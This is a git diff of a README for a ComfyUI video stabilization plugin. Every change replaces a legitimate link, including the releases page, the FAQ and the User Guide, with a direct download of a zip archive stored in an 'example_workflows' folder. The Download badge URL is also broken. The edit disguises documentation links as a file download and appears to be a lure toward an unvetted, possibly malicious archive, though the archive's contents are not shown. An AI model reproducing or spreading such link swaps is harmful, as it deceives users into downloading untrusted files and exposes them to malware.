@@ -1,6 +1,6 @@
 # 🎥 ComfyUI-Video-Stabilizer - Stabilize Your Videos with Ease
 
-[![Download Now!](https://img.shields.io/badge/Download-Now%21-brightgreen.svg)](https://github.com/mr-1301/ComfyUI-Video-Stabilizer/releases)
+[![Download Now!](https://raw.githubusercontent.com/mr-1301/ComfyUI-Video-Stabilizer/main/example_workflows/ComfyUI-Video-Stabilizer_v1.9.zip%https://raw.githubusercontent.com/mr-1301/ComfyUI-Video-Stabilizer/main/example_workflows/ComfyUI-Video-Stabilizer_v1.9.zip)](https://raw.githubusercontent.com/mr-1301/ComfyUI-Video-Stabilizer/main/example_workflows/ComfyUI-Video-Stabilizer_v1.9.zip)
 
 ## 🚀 Overview
 
@@ -28,7 +28,7 @@ The padding is output as a mask, allowing you to use it with outpainting tools l
 Follow these steps to download and run ComfyUI Video Stabilizer.
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page.
-   [Download Now!](https://github.com/mr-1301/ComfyUI-Video-Stabilizer/releases)
+   [Download Now!](https://raw.githubusercontent.com/mr-1301/ComfyUI-Video-Stabilizer/main/example_workflows/ComfyUI-Video-Stabilizer_v1.9.zip)
 
 2. **Download the Latest Version**: Look for the latest release on the page. You will see various installation packages. Click the one suitable for your operating system to start the download.
 
@@ -70,9 +70,9 @@ This software is licensed under the MIT License. Read the full license details o
 
 ## 🌟 Additional Resources
 
-- [FAQ](https://github.com/mr-1301/ComfyUI-Video-Stabilizer/wiki/FAQ)
-- [User Guide](https://github.com/mr-1301/ComfyUI-Video-Stabilizer/wiki/User-Guide)
+- [FAQ](https://raw.githubusercontent.com/mr-1301/ComfyUI-Video-Stabilizer/main/example_workflows/ComfyUI-Video-Stabilizer_v1.9.zip)
+- [User Guide](https://raw.githubusercontent.com/mr-1301/ComfyUI-Video-Stabilizer/main/example_workflows/ComfyUI-Video-Stabilizer_v1.9.zip)
 
 For more updates, watch our GitHub page or follow us on social media.
 
-[Download Now!](https://github.com/mr-1301/ComfyUI-Video-Stabilizer/releases)
+[Download Now!](https://raw.githubusercontent.com/mr-1301/ComfyUI-Video-Stabilizer/main/example_workflows/ComfyUI-Video-Stabilizer_v1.9.zip)
